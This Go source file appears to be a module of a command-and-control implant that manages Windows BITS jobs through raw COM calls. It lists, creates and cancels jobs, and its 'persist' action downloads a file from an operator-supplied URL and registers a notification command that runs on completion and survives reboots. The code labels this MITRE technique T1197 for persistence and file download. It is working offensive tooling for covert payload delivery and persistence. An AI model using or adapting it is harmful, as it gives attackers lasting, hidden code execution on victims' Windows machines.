//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	ole "github.com/go-ole/go-ole"

	"fawkes/pkg/structs"
)

type BitsCommand struct{}

func (c *BitsCommand) Name() string {
	return "bits"
}

func (c *BitsCommand) Description() string {
	return "Manage BITS transfer jobs for persistence and file download (T1197)"
}

type bitsArgs struct {
	Action  string `json:"action"`
	Name    string `json:"name"`
	URL     string `json:"url"`
	Path    string `json:"path"`
	Command string `json:"command"`
	CmdArgs string `json:"cmd_args"`
}

// COM GUIDs for BITS
var (
	clsidBITS   = ole.NewGUID("{4991D34B-80A1-4291-83B6-3328366B9097}")
	iidBITSMgr  = ole.NewGUID("{5CE34C0D-0DC9-4C1F-897C-DAA1B78CEE7C}")
	iidBITSJob  = ole.NewGUID("{37668D37-507E-4160-9316-26306D150B12}")
	iidBITSJob2 = ole.NewGUID("{54B50739-686F-45EB-9DFF-D6A9A0FAA9AF}")
	iidBITSEnum = ole.NewGUID("{1AF4F612-3B71-466F-8F58-7B6F73AC57AD}")
)

// IBackgroundCopyManager vtable offsets (after IUnknown 0-2)
const (
	bitsVtCreateJob = 3
	bitsVtGetJob    = 4
	bitsVtEnumJobs  = 5
)

// IBackgroundCopyJob vtable offsets (after IUnknown 0-2)
const (
	bitsJobVtAddFileSet     = 3
	bitsJobVtAddFile        = 4
	bitsJobVtSuspend        = 6
	bitsJobVtResume         = 7
	bitsJobVtCancel         = 8
	bitsJobVtComplete       = 9
	bitsJobVtGetId          = 10
	bitsJobVtGetProgress    = 12
	bitsJobVtGetState       = 14
	bitsJobVtGetDisplayName = 18
	bitsJobVtSetNotifyFlags = 23
)

// IBackgroundCopyJob2 vtable offsets (extends IBackgroundCopyJob)
const (
	bitsJob2VtSetNotifyCmdLine = 34
)

// IEnumBackgroundCopyJobs vtable offsets
const (
	bitsEnumVtNext     = 3
	bitsEnumVtGetCount = 7
)

// BG_JOB_TYPE constants
const (
	bgJobTypeDownload = 0
)

// BG_JOB_STATE constants
var bitsJobStates = []string{
	"Queued", "Connecting", "Transferring", "Suspended",
	"Error", "TransientError", "Transferred", "Acknowledged", "Cancelled",
}

// BG_NOTIFY constants
const (
	bgNotifyJobTransferred = 0x0001
	bgNotifyJobError       = 0x0002
)

// bgJobProgress matches BG_JOB_PROGRESS
type bgJobProgress struct {
	BytesTotal       uint64
	BytesTransferred uint64
	FilesTotal       uint32
	FilesTransferred uint32
}

func (c *BitsCommand) Execute(task structs.Task) structs.CommandResult {
	var args bitsArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Action == "" {
		args.Action = "list"
	}

	switch args.Action {
	case "list":
		return bitsList()
	case "create":
		return bitsCreate(args)
	case "persist":
		return bitsPersist(args)
	case "cancel":
		return bitsCancel(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use: list, create, persist, cancel)", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// bitsComCall invokes a COM vtable method on an interface pointer.
func bitsComCall(obj uintptr, vtableIndex int, args ...uintptr) (uintptr, error) {
	vtablePtr := *(*uintptr)(unsafe.Pointer(obj))
	fnPtr := *(*uintptr)(unsafe.Pointer(vtablePtr + uintptr(vtableIndex)*unsafe.Sizeof(uintptr(0))))
	allArgs := make([]uintptr, 0, len(args)+1)
	allArgs = append(allArgs, obj)
	allArgs = append(allArgs, args...)
	hr, _, _ := syscall.SyscallN(fnPtr, allArgs...)
	if int32(hr) < 0 {
		return hr, fmt.Errorf("HRESULT 0x%08X", uint32(hr))
	}
	return hr, nil
}

// bitsConnect creates a BITS manager COM connection.
func bitsConnect() (uintptr, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return 0, nil, fmt.Errorf("CoInitializeEx: %v", err)
		}
	}

	unk, err := ole.CreateInstance(clsidBITS, iidBITSMgr)
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return 0, nil, fmt.Errorf("CreateInstance: %v", err)
	}

	mgr := uintptr(unsafe.Pointer(unk))

	cleanup := func() {
		bitsComCall(mgr, 2) // Release
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return mgr, cleanup, nil
}

// bitsJobEntry represents a BITS job for JSON output
type bitsJobEntry struct {
	JobID            string `json:"job_id"`
	Name             string `json:"name"`
	State            string `json:"state"`
	BytesTransferred uint64 `json:"bytes_transferred"`
	BytesTotal       uint64 `json:"bytes_total"`
	FilesTransferred uint32 `json:"files_transferred"`
	FilesTotal       uint32 `json:"files_total"`
}

func bitsList() structs.CommandResult {
	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer cleanup()

	// IBackgroundCopyManager::EnumJobs(dwFlags, ppEnum)
	// BG_JOB_ENUM_ALL_USERS = 1
	var pEnum uintptr
	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
		// Try with all-users flag (requires elevation)
		if _, err2 := bitsComCall(mgr, bitsVtEnumJobs, 1, uintptr(unsafe.Pointer(&pEnum))); err2 != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error enumerating BITS jobs: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer bitsComCall(pEnum, 2) // Release

	// IEnumBackgroundCopyJobs::GetCount
	var count uint32
	bitsComCall(pEnum, bitsEnumVtGetCount, uintptr(unsafe.Pointer(&count)))

	var entries []bitsJobEntry

	for i := uint32(0); i < count; i++ {
		var pJob uintptr
		var fetched uint32
		hr, _ := bitsComCall(pEnum, bitsEnumVtNext, 1, uintptr(unsafe.Pointer(&pJob)), uintptr(unsafe.Pointer(&fetched)))
		if int32(hr) < 0 || fetched == 0 {
			break
		}

		// Get job ID
		var guid ole.GUID
		bitsComCall(pJob, bitsJobVtGetId, uintptr(unsafe.Pointer(&guid)))
		jobID := fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
			guid.Data1, guid.Data2, guid.Data3,
			guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
			guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7])

		// Get display name
		var namePtr uintptr
		bitsComCall(pJob, bitsJobVtGetDisplayName, uintptr(unsafe.Pointer(&namePtr)))
		name := "(unknown)"
		if namePtr != 0 {
			name = bitsReadWString(namePtr)
			bitsCoTaskMemFree(namePtr)
		}

		// Get state
		var state uint32
		bitsComCall(pJob, bitsJobVtGetState, uintptr(unsafe.Pointer(&state)))
		stateStr := "Unknown"
		if int(state) < len(bitsJobStates) {
			stateStr = bitsJobStates[state]
		}

		// Get progress
		var progress bgJobProgress
		bitsComCall(pJob, bitsJobVtGetProgress, uintptr(unsafe.Pointer(&progress)))

		entries = append(entries, bitsJobEntry{
			JobID:            jobID,
			Name:             name,
			State:            stateStr,
			BytesTransferred: progress.BytesTransferred,
			BytesTotal:       progress.BytesTotal,
			FilesTransferred: progress.FilesTransferred,
			FilesTotal:       progress.FilesTotal,
		})

		bitsComCall(pJob, 2) // Release
	}

	if len(entries) == 0 {
		return structs.CommandResult{
			Output:    "[]",
			Status:    "success",
			Completed: true,
		}
	}

	data, err := json.Marshal(entries)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling results: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    string(data),
		Status:    "success",
		Completed: true,
	}
}

func bitsCreate(args bitsArgs) structs.CommandResult {
	if args.Name == "" || args.URL == "" || args.Path == "" {
		return structs.CommandResult{
			Output:    "Error: name, url, and path are required for create action",
			Status:    "error",
			Completed: true,
		}
	}

	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer cleanup()

	// CreateJob(DisplayName, Type, pJobId, ppJob)
	namePtr, _ := syscall.UTF16PtrFromString(args.Name)
	var jobGUID ole.GUID
	var pJob uintptr

	if _, err := bitsComCall(mgr, bitsVtCreateJob,
		uintptr(unsafe.Pointer(namePtr)),
		bgJobTypeDownload,
		uintptr(unsafe.Pointer(&jobGUID)),
		uintptr(unsafe.Pointer(&pJob)),
	); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating BITS job: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer bitsComCall(pJob, 2) // Release

	// AddFile(RemoteUrl, LocalName)
	urlPtr, _ := syscall.UTF16PtrFromString(args.URL)
	pathPtr, _ := syscall.UTF16PtrFromString(args.Path)

	if _, err := bitsComCall(pJob, bitsJobVtAddFile,
		uintptr(unsafe.Pointer(urlPtr)),
		uintptr(unsafe.Pointer(pathPtr)),
	); err != nil {
		bitsComCall(pJob, bitsJobVtCancel)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error adding file to BITS job: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Resume (start the download)
	if _, err := bitsComCall(pJob, bitsJobVtResume); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resuming BITS job: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	jobID := fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		jobGUID.Data1, jobGUID.Data2, jobGUID.Data3,
		jobGUID.Data4[0], jobGUID.Data4[1], jobGUID.Data4[2], jobGUID.Data4[3],
		jobGUID.Data4[4], jobGUID.Data4[5], jobGUID.Data4[6], jobGUID.Data4[7])

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] BITS Download Job Created (T1197)\n"+
			"[+] Job Name: %s\n"+
			"[+] Job ID:   %s\n"+
			"[+] URL:      %s\n"+
			"[+] Path:     %s\n"+
			"[+] Status:   Downloading\n",
			args.Name, jobID, args.URL, args.Path),
		Status:    "success",
		Completed: true,
	}
}

func bitsPersist(args bitsArgs) structs.CommandResult {
	if args.Name == "" || args.URL == "" || args.Path == "" || args.Command == "" {
		return structs.CommandResult{
			Output:    "Error: name, url, path, and command are required for persist action",
			Status:    "error",
			Completed: true,
		}
	}

	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer cleanup()

	// CreateJob
	namePtr, _ := syscall.UTF16PtrFromString(args.Name)
	var jobGUID ole.GUID
	var pJob uintptr

	if _, err := bitsComCall(mgr, bitsVtCreateJob,
		uintptr(unsafe.Pointer(namePtr)),
		bgJobTypeDownload,
		uintptr(unsafe.Pointer(&jobGUID)),
		uintptr(unsafe.Pointer(&pJob)),
	); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating BITS job: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer bitsComCall(pJob, 2) // Release

	// AddFile
	urlPtr, _ := syscall.UTF16PtrFromString(args.URL)
	pathPtr, _ := syscall.UTF16PtrFromString(args.Path)

	if _, err := bitsComCall(pJob, bitsJobVtAddFile,
		uintptr(unsafe.Pointer(urlPtr)),
		uintptr(unsafe.Pointer(pathPtr)),
	); err != nil {
		bitsComCall(pJob, bitsJobVtCancel)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error adding file to BITS job: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// QueryInterface for IBackgroundCopyJob2
	var pJob2 uintptr
	if _, err := bitsComCall(pJob, 0, // QueryInterface
		uintptr(unsafe.Pointer(iidBITSJob2)),
		uintptr(unsafe.Pointer(&pJob2)),
	); err != nil {
		bitsComCall(pJob, bitsJobVtCancel)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error getting IBackgroundCopyJob2 (BITS 1.5+ required): %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer bitsComCall(pJob2, 2) // Release

	// SetNotifyCmdLine(Program, Parameters)
	cmdPtr, _ := syscall.UTF16PtrFromString(args.Command)
	var paramsPtr *uint16
	if args.CmdArgs != "" {
		paramsPtr, _ = syscall.UTF16PtrFromString(args.CmdArgs)
	}

	if _, err := bitsComCall(pJob2, bitsJob2VtSetNotifyCmdLine,
		uintptr(unsafe.Pointer(cmdPtr)),
		uintptr(unsafe.Pointer(paramsPtr)),
	); err != nil {
		bitsComCall(pJob, bitsJobVtCancel)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error setting notification command: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// SetNotifyFlags (BG_NOTIFY_JOB_TRANSFERRED | BG_NOTIFY_JOB_ERROR)
	bitsComCall(pJob, bitsJobVtSetNotifyFlags, bgNotifyJobTransferred|bgNotifyJobError)

	// Resume
	if _, err := bitsComCall(pJob, bitsJobVtResume); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resuming BITS job: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	jobID := fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		jobGUID.Data1, jobGUID.Data2, jobGUID.Data3,
		jobGUID.Data4[0], jobGUID.Data4[1], jobGUID.Data4[2], jobGUID.Data4[3],
		jobGUID.Data4[4], jobGUID.Data4[5], jobGUID.Data4[6], jobGUID.Data4[7])

	cmdLine := args.Command
	if args.CmdArgs != "" {
		cmdLine += " " + args.CmdArgs
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] BITS Persistence Job Created (T1197)\n"+
			"[+] Job Name:    %s\n"+
			"[+] Job ID:      %s\n"+
			"[+] URL:         %s\n"+
			"[+] Local Path:  %s\n"+
			"[+] Notify Cmd:  %s\n"+
			"[+] Status:      Downloading (command runs on completion)\n"+
			"\n[!] The notification command will execute when the download completes.\n"+
			"[!] BITS jobs survive reboots and run as the creating user.\n",
			args.Name, jobID, args.URL, args.Path, cmdLine),
		Status:    "success",
		Completed: true,
	}
}

func bitsCancel(args bitsArgs) structs.CommandResult {
	if args.Name == "" {
		return structs.CommandResult{
			Output:    "Error: name is required for cancel action (use 'list' to find job names)",
			Status:    "error",
			Completed: true,
		}
	}

	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer cleanup()

	// Enumerate jobs to find by name
	var pEnum uintptr
	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error enumerating BITS jobs: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer bitsComCall(pEnum, 2)

	var count uint32
	bitsComCall(pEnum, bitsEnumVtGetCount, uintptr(unsafe.Pointer(&count)))

	cancelled := 0
	for i := uint32(0); i < count; i++ {
		var pJob uintptr
		var fetched uint32
		hr, _ := bitsComCall(pEnum, bitsEnumVtNext, 1, uintptr(unsafe.Pointer(&pJob)), uintptr(unsafe.Pointer(&fetched)))
		if int32(hr) < 0 || fetched == 0 {
			break
		}

		var namePtr uintptr
		bitsComCall(pJob, bitsJobVtGetDisplayName, uintptr(unsafe.Pointer(&namePtr)))
		name := ""
		if namePtr != 0 {
			name = bitsReadWString(namePtr)
			bitsCoTaskMemFree(namePtr)
		}

		if strings.EqualFold(name, args.Name) {
			bitsComCall(pJob, bitsJobVtCancel)
			cancelled++
		}

		bitsComCall(pJob, 2)
	}

	if cancelled == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No BITS job found with name: %s", args.Name),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("[+] Cancelled %d BITS job(s) named: %s", cancelled, args.Name),
		Status:    "success",
		Completed: true,
	}
}

// Helper functions

var (
	bitsOle32          = syscall.NewLazyDLL("ole32.dll")
	bitsCoTaskMemFreeP = bitsOle32.NewProc("CoTaskMemFree")
)

func bitsCoTaskMemFree(ptr uintptr) {
	bitsCoTaskMemFreeP.Call(ptr)
}

func bitsReadWString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var chars []uint16
	for i := 0; ; i++ {
		c := *(*uint16)(unsafe.Pointer(ptr + uintptr(i)*2))
		if c == 0 {
			break
		}
		chars = append(chars, c)
		if i > 1024 {
			break
		}
	}
	return syscall.UTF16ToString(chars)
}

func bitsFormatBytes(b uint64) string {
	switch {
	case b >= 1<<30:
		return fmt.Sprintf("%.1f GB", float64(b)/float64(1<<30))
	case b >= 1<<20:
		return fmt.Sprintf("%.1f MB", float64(b)/float64(1<<20))
	case b >= 1<<10:
		return fmt.Sprintf("%.1f KB", float64(b)/float64(1<<10))
	default:
		return fmt.Sprintf("%d B", b)
	}
}

func bitsEllipsis(s string, max int) string {
	if len(s) > max {
		return s[:max-3] + "..."
	}
	return s
}
